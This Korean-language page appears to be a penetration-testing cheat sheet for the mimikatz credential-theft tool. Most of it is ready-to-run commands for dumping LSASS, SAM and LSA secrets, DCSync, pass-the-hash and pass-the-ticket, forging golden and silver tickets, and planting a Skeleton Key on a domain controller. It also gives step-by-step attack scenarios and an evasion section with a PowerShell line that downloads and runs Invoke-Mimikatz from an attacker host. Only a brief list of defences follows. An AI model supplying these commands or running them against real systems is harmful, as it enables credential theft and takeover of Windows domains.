---
sidebar_position: 5
---

# mimikatz

> https://github.com/gentilkiwi/mimikatz

Windows 자격증명 추출 도구입니다.

## 다운로드

```
https://github.com/gentilkiwi/mimikatz/releases
```

## 기본 실행

```cmd
.\mimikatz.exe
```

## 권한 상승

```cmd
# 관리자 권한으로 실행 후
privilege::debug
token::elevate
```

## 일반 명령어

### 자격증명 덤프

```cmd
# LSASS에서 자격증명 추출
sekurlsa::logonpasswords

# 모든 자격증명
sekurlsa::logonpasswords full

# Kerberos 티켓
sekurlsa::tickets

# Kerberos 티켓 내보내기
sekurlsa::tickets /export
```

### SAM 데이터베이스

```cmd
# SAM 해시 덤프
lsadump::sam

# 로컬 SAM
lsadump::sam /system:C:\Windows\System32\config\SYSTEM /sam:C:\Windows\System32\config\SAM
```

### LSA Secrets

```cmd
lsadump::secrets
lsadump::cache
```

### NTDS.dit (Domain Controller)

```cmd
# DCSync 공격
lsadump::dcsync /user:Administrator
lsadump::dcsync /user:<DOMAIN>\krbtgt
lsadump::dcsync /domain:<DOMAIN> /all /csv

# 특정 사용자
lsadump::dcsync /user:<DOMAIN>\<USERNAME> /domain:<DOMAIN>
```

## Vault (Windows Vault)

```cmd
vault::list
vault::cred
vault::cred /patch
```

## Kerberos 공격

### Pass the Ticket (PtT)

```cmd
# 1. 티켓 추출
sekurlsa::tickets /export

# 2. 티켓 주입
kerberos::ptt [0;12bd0]-0-0-40810000-Administrator@krbtgt-<DOMAIN>.kirbi

# 3. 확인
klist

# 4. 접근
dir \\<DC>\c$
```

### Golden Ticket

```cmd
# 1. krbtgt 해시 얻기 (DCSync)
lsadump::lsa /inject /name:krbtgt

# 2. Golden Ticket 생성
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-xxx-xxx-xxx /krbtgt:<KRBTGT_HASH> /id:500

# 또는 더 자세하게
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500 /ptt

# 3. CMD 실행
misc::cmd

# 4. 확인
klist
dir \\<DC>\admin$
```

### Silver Ticket

```cmd
# 특정 서비스의 NTLM 해시로 티켓 생성
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-xxx-xxx-xxx /target:<TARGET> /service:<SERVICE> /rc4:<HASH> /ptt

# 예: CIFS 서비스
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /target:server.corp.local /service:cifs /rc4:<HASH> /ptt
```

### Skeleton Key

```cmd
# DC에 Skeleton Key 삽입 (모든 계정에 'mimikatz' 비밀번호 추가)
privilege::debug
misc::skeleton

# 이후 어떤 계정이든 'mimikatz' 비밀번호로 로그인 가능
net use \\<DC>\admin$ /user:Administrator mimikatz
dir \\<DC>\c$ /user:<USERNAME> mimikatz
```

## Pass the Hash (PtH)

```cmd
# NTLM 해시로 인증
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:abc123... /run:powershell.exe
```

## Over Pass the Hash

```cmd
# NTLM 해시에서 Kerberos TGT 획득
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe

# PowerShell에서
klist
net use \\<DC>\c$
```

## Minidump 분석

### 덤프 생성 (대상 시스템)

```powershell
# Task Manager로 lsass.exe 프로세스 덤프
# 또는 ProcDump 사용
procdump.exe -ma lsass.exe lsass.dmp
```

### 덤프 분석 (공격자 시스템)

```cmd
.\mimikatz.exe
sekurlsa::minidump C:\path\to\lsass.dmp
sekurlsa::logonpasswords
```

## 토큰 조작

```cmd
# 토큰 상승
token::elevate

# 토큰 복원
token::revert

# 도메인 관리자 토큰 가장
token::elevate /domainadmin

# 시스템 토큰
token::elevate /system
```

## 기타 유용한 명령

### 현재 사용자 정보

```cmd
token::whoami
```

### 로그 기록

```cmd
log <FILE>
log mimikatz.log
```

### 종료

```cmd
exit
```

## 실제 공격 시나리오

### 시나리오 1: 로컬 자격증명 덤프

```cmd
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
exit
```

### 시나리오 2: DCSync 공격

```cmd
.\mimikatz.exe
lsadump::dcsync /user:krbtgt /domain:corp.local
exit
```

### 시나리오 3: Golden Ticket 공격

```cmd
# 1. krbtgt 해시 획득
.\mimikatz.exe
lsadump::dcsync /user:krbtgt /domain:corp.local

# 2. Golden Ticket 생성
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:<HASH> /ptt

# 3. 접근
misc::cmd
dir \\dc01\c$
```

### 시나리오 4: Pass the Ticket

```cmd
# 1. 티켓 추출
sekurlsa::tickets /export

# 2. 티켓 주입
kerberos::ptt ticket.kirbi

# 3. 접근
dir \\dc01\c$
```

## Meterpreter에서 사용

```bash
# Meterpreter 세션에서
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
meterpreter > dcsync_ntlm krbtgt
```

## 탐지 회피

### 메모리에서만 실행

```powershell
# Invoke-Mimikatz (PowerShell)
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### 난독화

```powershell
# 난독화된 버전 사용
# 또는 직접 소스 수정 후 컴파일
```

## 방어 및 탐지

Mimikatz 공격 방지:
- LSA Protection 활성화
- Credential Guard 사용
- WDigest 비활성화
- LSASS 프로세스 보호
- 최소 권한 원칙
- Pass-the-Hash 완화 정책

## 참고

- 관리자 권한 필요
- `privilege::debug` 필수
- Windows Defender에 의해 차단될 수 있음
- DCSync는 Domain Admin 또는 특정 권한 필요
- Golden Ticket은 krbtgt 해시 필요
- Skeleton Key는 재부팅 시 제거됨
- LSASS 덤프는 오프라인 분석 가능
- Meterpreter의 kiwi 모듈이 더 편리
- 최신 Windows는 추가 보안 기능으로 방어
